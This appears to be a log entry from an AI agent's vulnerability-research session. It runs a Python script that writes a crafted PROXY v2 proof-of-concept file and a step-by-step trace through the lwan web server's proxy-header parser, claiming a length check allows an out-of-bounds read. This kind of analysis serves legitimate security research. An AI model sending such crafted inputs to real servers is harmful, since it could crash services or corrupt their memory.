message:
Command `python3 - <<'PY'
from pathlib import Path
# create a more plausible minimal HTTP request after the PROXY header
sig = bytes.fromhex('0d0a0d0a000d0a515549540a')
# PROXY v2, TCP4, len=12 (address block only)
hdr = sig + bytes([0x21, 0x11]) + (12).to_bytes(2, 'big')
addr = bytes.fromhex('7f0000017f00000130390050')  # 127.0.0.1:12345 -> 127.0.0.1:80
http = b'GET / HTTP/1.1\r\nHost: x\r\n\r\n'
Path('/workspace/poc2.bin').write_bytes(hdr + addr + http)
trace = [
  {"step":1,"file":"src/lib/lwan-request.c","function":"parse_http_request","line":1170,"var":"request->flags","code":"if (request->flags & REQUEST_ALLOW_PROXY_REQS) { buffer = parse_proxy_protocol(request, buffer); }","note":"The configured listener accepts PROXY-prefixed requests and forwards the beginning of the attacker-controlled buffer to the proxy parser."},
  {"step":2,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol","line":1153,"var":"buffer","code":"switch on the first four bytes to choose PROXY v1 or v2 parsing","note":"The request is classified as PROXY protocol data before HTTP parsing starts."},
  {"step":3,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":223,"var":"hdr","code":"struct proxy_header_v2 *hdr = (struct proxy_header_v2 *)buffer;","note":"The parser interprets the attacker bytes as a PROXY v2 header and reads the version, family, and length fields from it."},
  {"step":4,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":233,"var":"size","code":"size = proto_signature_length + (unsigned int)ntohs(hdr->len); if (size > sizeof(*hdr)) return NULL;","note":"The length check uses the fixed header struct size instead of the actual request buffer size, so a crafted frame length can desynchronize the parser from the real input layout."},
  {"step":5,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":254,"var":"buffer","code":"buffer += size;","note":"After accepting the frame, the parser advances the pointer by the attacker-controlled size, skipping into the following bytes that are meant to be the HTTP request."},
  {"step":6,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":266,"var":"helper->crlfcrlf","code":"helper->crlfcrlf = memmem(buffer, adjusted_size, \"\\r\\n\\r\\n\", 4);","note":"The remaining-region scan uses the adjusted pointer arithmetic; if the crafted length does not match the actual bytes available, the scan can walk outside the intended request contents and corrupt or overread memory during parsing."}
]
Path('/workspace/candidate_trace.json').write_text(__import__('json').dumps(trace, ensure_ascii=False, indent=2))
print('wrote', '/workspace/poc2.bin')
PY` executed with exit code 0.
